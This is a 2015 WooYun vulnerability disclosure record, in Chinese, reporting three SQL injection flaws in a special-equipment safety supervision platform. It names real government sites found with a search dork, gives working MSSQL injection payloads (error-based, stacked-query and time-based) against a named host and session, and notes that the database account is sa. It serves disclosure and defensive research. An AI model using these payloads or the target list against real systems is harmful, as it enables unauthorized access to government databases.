{"id": 37494, "wybug_id": "wooyun-2015-099564", "wybug_title": "某特种设备安全平台SQL注入漏洞三处", "wybug_corp": "国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-03-09 10:22", "wybug_open_date": "2015-06-11 15:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向公众公开  简要描述： 某特种设备安全平台SQL注入漏洞三处 详细说明：  系统名称：特种设备安全监察动态监管系统系统结构：JSP+MSSQL注入漏洞一：漏洞文件：select_result.jspPOST注入参数：SFZ_ID注入漏洞二：select_result.jspPOST注入参数：PXBID注入漏洞三：漏洞文件：select_result.jspPOST注入参数：NAME算是同一文件下，三个不同的参数过滤不严格导致的注入漏洞   漏洞证明：  关键字：inurl:comment_info.jsp?sslm=\n\n部分案例：广西特种设备监察网：http://tzsb.gxqts.gov.cn/index.jsp海南特种设备网：http://www.hntsw.gov.cn/select_result.jsp福建省特种设备协会：http://www.fjase.com/index.jsp南京市特种设备安全监察动态监管系统：http://58.213.147.216/黑龙江特种设备安全监察网：http://www.hljts.gov.cn/index.jsp陕西特种设备监察网：http://www.sxtsaj.com/index.jsp江西特种设备监察网：http://111.75.211.4/index.jsp等等漏洞验证：SQL注入一：以：http://www.sxtsaj.com/ry_sldjb_Action.do;jsessionid=2A929079C721DF160922512CD28B3A81为例参数SFZ_ID\nPlace: POSTParameter: SFZ_ID    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TASK=select_submit_web&SFZ_ID=666666' AND 7773=CONVERT(INT,(CHAR(58) CHAR(97) CHAR(111) CHAR(102) CHAR(58) (SELECT (CASE WHEN (7773=7773) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(119) CHAR(114) CHAR(121) CHAR(58))) AND 'NvOl'='NvOl&PXBID=SN1602&NAME=666666    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: TASK=select_submit_web&SFZ_ID=666666'; WAITFOR DELAY '0:0:5'--&PXBID=SN1602&NAME=666666    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: TASK=select_submit_web&SFZ_ID=666666' WAITFOR DELAY '0:0:5'--&PXBID=SN1602&NAME=666666\n\n\n数据库信息：\n\n注入二：参数：PXBIDhttp://www.sxtsaj.com/ry_sldjb_Action.do;jsessionid=2A929079C721DF160922512CD28B3A81\nPlace: POSTParameter: PXBID    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TASK=select_submit_web&SFZ_ID=666666&PXBID=SN1602' AND 7980=CONVERT(INT,(CHAR(58) CHAR(97) CHAR(111) CHAR(102) CHAR(58) (SELECT (CASE WHEN (7980=7980) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(119) CHAR(114) CHAR(121) CHAR(58))) AND 'atyr'='atyr&NAME=666666    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: TASK=select_submit_web&SFZ_ID=666666&PXBID=SN1602'; WAITFOR DELAY '0:0:5'--&NAME=666666    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: TASK=select_submit_web&SFZ_ID=666666&PXBID=SN1602' WAITFOR DELAY '0:0:5'--&NAME=666666---\n\n\n当前用户sa\n\n注入三：http://www.sxtsaj.com/ry_sldjb_Action.do;jsessionid=2A929079C721DF160922512CD28B3A81参数:NAME\nPlace: POSTParameter: NAME    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: TASK=select_submit_web&SFZ_ID=666666&PXBID=SN1602&NAME=666666' AND2232=CONVERT(INT,(CHAR(58) CHAR(97) CHAR(111) CHAR(102) CHAR(58) (SELECT (CASE WHEN (2232=2232) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(119) CHAR(114) CHAR(121) CHAR(58))) AND 'wnnd'='wnnd    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: TASK=select_submit_web&SFZ_ID=666666&PXBID=SN1602&NAME=666666'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: TASK=select_submit_web&SFZ_ID=666666&PXBID=SN1602&NAME=666666' WAITFOR DELAY '0:0:5'-----\n\n\nDBA权限：\n\n其他如上！   修复方案：  多参数过滤。。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-03-13 15:18 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}